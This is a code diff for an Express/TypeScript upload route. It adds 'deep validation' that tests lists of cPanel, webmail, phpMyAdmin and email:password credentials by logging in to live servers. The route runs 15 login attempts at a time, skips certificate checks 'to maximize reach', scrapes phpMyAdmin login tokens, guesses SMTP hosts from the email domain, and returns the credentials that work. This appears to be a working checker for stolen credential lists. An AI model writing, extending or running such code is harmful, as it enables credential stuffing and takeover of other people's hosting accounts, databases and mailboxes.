@@ -8,6 +8,10 @@ import { validateSmtpConfig, validateAndProcessFile, sortSmtpConfigs } from '../
 import multer from 'multer';
 import { emailService } from '../services/emailService';
 import { promises as dns } from 'dns';
+import nodemailer from 'nodemailer';
+import https from 'https';
+import http from 'http';
+import { URL } from 'url';
 
 const router = Router();
 
@@ -495,16 +499,137 @@ router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('
     }
 
     // Helper: fetch with timeout (Node 18 global fetch)
-    const fetchWithTimeout = async (url: string, ms: number): Promise<{ ok: boolean; status?: number; error?: string }> => {
+    const fetchWithTimeout = async (url: string, ms: number): Promise<{ ok: boolean; status?: number; error?: string; body?: string; headers?: any }> => {
       const controller = new AbortController();
       const timer = setTimeout(() => controller.abort(), ms);
       try {
         const res: any = await (globalThis as any).fetch(url, { method: 'GET', redirect: 'follow', signal: controller.signal });
-        return { ok: res.ok || (res.status && res.status < 500), status: res.status };
+        const text = await res.text();
+        return { ok: res.ok || (res.status && res.status < 500), status: res.status, body: text, headers: res.headers };
       } catch (e: any) {
         return { ok: false, error: e?.message || 'request failed' };
       } finally {
         clearTimeout(timer);
+      }
+    };
+
+    // cPanel/Webmail deep login via login_only=1 (supports both 2083 and 2096)
+    const cpanelLogin = (loginUrl: string, username: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; error?: string }> => {
+      return new Promise((resolve) => {
+        try {
+          const parsed = new URL(loginUrl);
+          // Force path to login_only endpoint
+          const target = `${parsed.protocol}//${parsed.host}/login/?login_only=1`;
+          const data = new URLSearchParams({ user: username, pass: password }).toString();
+          const isHttps = parsed.protocol === 'https:';
+          const lib = isHttps ? https : http;
+          const req = lib.request(target, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Content-Length': Buffer.byteLength(data).toString()
+            },
+            // ignore bad certs to maximize reach
+            agent: isHttps ? new https.Agent({ rejectUnauthorized: false }) : undefined,
+            timeout: timeoutMs
+          }, (res) => {
+            const chunks: Buffer[] = [];
+            res.on('data', (d) => chunks.push(d as any));
+            res.on('end', () => {
+              try {
+                const str = Buffer.concat(chunks).toString('utf-8');
+                const json = JSON.parse(str);
+                if (json && (json.status === 1 || json.security_token)) return resolve({ ok: true });
+                return resolve({ ok: false, error: json?.reason || 'auth failed' });
+              } catch (e: any) {
+                return resolve({ ok: false, error: 'invalid response' });
+              }
+            });
+          });
+          req.on('error', (err: any) => resolve({ ok: false, error: err?.message || 'request error' }));
+          req.on('timeout', () => { try { req.destroy(); } catch {} resolve({ ok: false, error: 'timeout' }); });
+          req.write(data);
+          req.end();
+        } catch (e: any) {
+          resolve({ ok: false, error: e?.message || 'cpanel login error' });
+        }
+      });
+    };
+
+    // phpMyAdmin deep login: GET to capture token if present, then POST credentials
+    const phpMyAdminLogin = async (baseUrl: string, username: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; error?: string }> => {
+      try {
+        const get = await fetchWithTimeout(baseUrl, timeoutMs);
+        let token: string | undefined;
+        if (get.ok && get.body) {
+          const m = get.body.match(/name=["']token["']\s+value=["']([^"']+)["']/i);
+          token = m ? m[1] : undefined;
+        }
+        // POST back to the same URL (most installs accept), include token if found
+        const params = new URLSearchParams({ pma_username: username, pma_password: password });
+        if (token) params.set('token', token);
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
+        try {
+          const res: any = await (globalThis as any).fetch(baseUrl, {
+            method: 'POST',
+            redirect: 'manual',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: params.toString(),
+            signal: controller.signal
+          });
+          const ok = res.status && (res.status === 302 || res.status === 303 || res.status === 200);
+          // Heuristic: login success often redirects (302) or shows logout on page
+          let success = false;
+          if (ok && (res.status === 302 || res.status === 303)) success = true;
+          if (!success && ok) {
+            const txt = await res.text();
+            if (/logout/i.test(txt) || /Log\s?out/i.test(txt)) success = true;
+          }
+          return { ok: success, error: success ? undefined : 'auth failed' };
+        } catch (e: any) {
+          return { ok: false, error: e?.message || 'request failed' };
+        } finally {
+          clearTimeout(timer);
+        }
+      } catch (e: any) {
+        return { ok: false, error: e?.message || 'phpmyadmin error' };
+      }
+    };
+
+    // Email:password deep check by attempting SMTP AUTH on common hosts
+    const smtpAuthLogin = async (email: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; host?: string; error?: string }> => {
+      try {
+        const domain = email.split('@')[1];
+        if (!domain) return { ok: false, error: 'invalid domain' };
+        const hosts = [`smtp.${domain}`, `mail.${domain}`];
+        const combos: Array<{ host: string; port: number; secure: boolean }> = [];
+        for (const h of hosts) {
+          combos.push({ host: h, port: 587, secure: false });
+          combos.push({ host: h, port: 465, secure: true });
+        }
+        for (const combo of combos) {
+          try {
+            const transporter = nodemailer.createTransport({
+              host: combo.host,
+              port: combo.port,
+              secure: combo.secure,
+              auth: { user: email, pass: password },
+              tls: { rejectUnauthorized: false }
+            });
+            const race = Promise.race([
+              transporter.verify(),
+              new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
+            ]);
+            await race;
+            return { ok: true, host: `${combo.host}:${combo.port}` };
+          } catch (e: any) {
+            // try next
+          }
+        }
+        return { ok: false, error: 'smtp auth failed' };
+      } catch (e: any) {
+        return { ok: false, error: e?.message || 'smtp auth error' };
       }
     };
 
@@ -564,6 +689,26 @@ router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('
       validateUrlList(acc.phpmyadmin)
     ]);
 
+    // Deep validation concurrently with modest limits
+    const deepLimit = 15;
+    const deepRun = async <T, R>(items: T[], fn: (t: T) => Promise<R>): Promise<R[]> => {
+      const out: R[] = new Array(items.length) as any;
+      let idx = 0;
+      const runNext = async (): Promise<void> => {
+        const i = idx++;
+        if (i >= items.length) return;
+        try { out[i] = await fn(items[i]); } catch (e: any) { out[i] = (e as any); }
+        return runNext();
+      };
+      await Promise.all(Array.from({ length: Math.min(deepLimit, items.length) }).map(() => runNext()));
+      return out;
+    };
+
+    const webmailDeep = await deepRun(acc.webmail, (w) => cpanelLogin(w.url, w.username, w.password));
+    const cpanelDeep = await deepRun(acc.cpanel, (c) => cpanelLogin(c.url, c.username, c.password));
+    const phpmyadminDeep = await deepRun(acc.phpmyadmin, (p) => phpMyAdminLogin(p.url, p.username, p.password));
+    const emailPairsDeep = await deepRun(acc.emailPairs, (ep) => smtpAuthLogin(ep.email, ep.password));
+
     // Validate email domains via MX lookup
     const validateEmailDomains = async (emails: string[]) => {
       const results: Array<{ value: string; ok: boolean; error?: string }> = [];
@@ -607,6 +752,16 @@ router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('
     const emailsValid = emailsDomainResults.filter(r => r.ok).map(r => r.value);
     const emailsInvalid = emailsDomainResults.filter(r => !r.ok).map(r => ({ email: r.value, error: r.error }));
 
+    // Deep results breakdown
+    const webmailDeepValid = webmailDeep.filter((r: any) => r?.ok).length;
+    const webmailDeepInvalid = webmailDeep.length - webmailDeepValid;
+    const cpanelDeepValid = cpanelDeep.filter((r: any) => r?.ok).length;
+    const cpanelDeepInvalid = cpanelDeep.length - cpanelDeepValid;
+    const phpmyadminDeepValid = phpmyadminDeep.filter((r: any) => r?.ok).length;
+    const phpmyadminDeepInvalid = phpmyadminDeep.length - phpmyadminDeepValid;
+    const emailPairsDeepValid = emailPairsDeep.filter((r: any) => r?.ok).length;
+    const emailPairsDeepInvalid = emailPairsDeep.length - emailPairsDeepValid;
+
     return res.json({
       success: true,
       stats: {
@@ -616,15 +771,23 @@ router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('
         webmail: acc.webmail.length,
         webmailValid: webmailValid.length,
         webmailInvalid: webmailInvalid.length,
+        webmailDeepValid,
+        webmailDeepInvalid,
         cpanel: acc.cpanel.length,
         cpanelValid: cpanelValid.length,
         cpanelInvalid: cpanelInvalid.length,
+        cpanelDeepValid,
+        cpanelDeepInvalid,
         phpmyadmin: acc.phpmyadmin.length,
         phpmyadminValid: phpmyadminValid.length,
         phpmyadminInvalid: phpmyadminInvalid.length,
+        phpmyadminDeepValid,
+        phpmyadminDeepInvalid,
         emailPairs: acc.emailPairs.length,
         emailPairsValid: emailPairsValid.length,
         emailPairsInvalid: emailPairsInvalid.length,
+        emailPairsDeepValid,
+        emailPairsDeepInvalid,
         emails: acc.emails.length,
         emailsValid: emailsValid.length,
         emailsInvalid: emailsInvalid.length,
@@ -634,12 +797,28 @@ router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('
         smtp: { valid: smtpValid, invalid: smtpInvalid.slice(0, 1000) },
         webmail: acc.webmail.slice(0, 1000),
         webmailValidated: { valid: webmailValid.slice(0, 1000), invalid: webmailInvalid.slice(0, 1000) },
+        webmailDeep: {
+          valid: acc.webmail.filter((_, i) => (webmailDeep[i] as any)?.ok).slice(0, 1000),
+          invalid: acc.webmail.map((it, i) => ({ item: it, error: (webmailDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(webmailDeep[i] as any)?.ok).slice(0, 1000)
+        },
         cpanel: acc.cpanel.slice(0, 1000),
         cpanelValidated: { valid: cpanelValid.slice(0, 1000), invalid: cpanelInvalid.slice(0, 1000) },
+        cpanelDeep: {
+          valid: acc.cpanel.filter((_, i) => (cpanelDeep[i] as any)?.ok).slice(0, 1000),
+          invalid: acc.cpanel.map((it, i) => ({ item: it, error: (cpanelDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(cpanelDeep[i] as any)?.ok).slice(0, 1000)
+        },
         phpmyadmin: acc.phpmyadmin.slice(0, 1000),
         phpmyadminValidated: { valid: phpmyadminValid.slice(0, 1000), invalid: phpmyadminInvalid.slice(0, 1000) },
+        phpmyadminDeep: {
+          valid: acc.phpmyadmin.filter((_, i) => (phpmyadminDeep[i] as any)?.ok).slice(0, 1000),
+          invalid: acc.phpmyadmin.map((it, i) => ({ item: it, error: (phpmyadminDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(phpmyadminDeep[i] as any)?.ok).slice(0, 1000)
+        },
         emailPairs: acc.emailPairs.slice(0, 1000),
         emailPairsValidated: { valid: emailPairsValid.slice(0, 1000), invalid: emailPairsInvalid.slice(0, 1000) },
+        emailPairsDeep: {
+          valid: acc.emailPairs.map((it, i) => ({ email: it.email, host: (emailPairsDeep[i] as any)?.host })).filter((_, i) => (emailPairsDeep[i] as any)?.ok).slice(0, 1000),
+          invalid: acc.emailPairs.map((it, i) => ({ email: it.email, error: (emailPairsDeep[i] as any)?.error || 'auth failed' })).filter((_, i) => !(emailPairsDeep[i] as any)?.ok).slice(0, 1000)
+        },
         emails: acc.emails.slice(0, 5000),
         emailsValidated: { valid: emailsValid.slice(0, 5000), invalid: emailsInvalid.slice(0, 1000) },
         unknown: acc.unknown.slice(0, 1000)
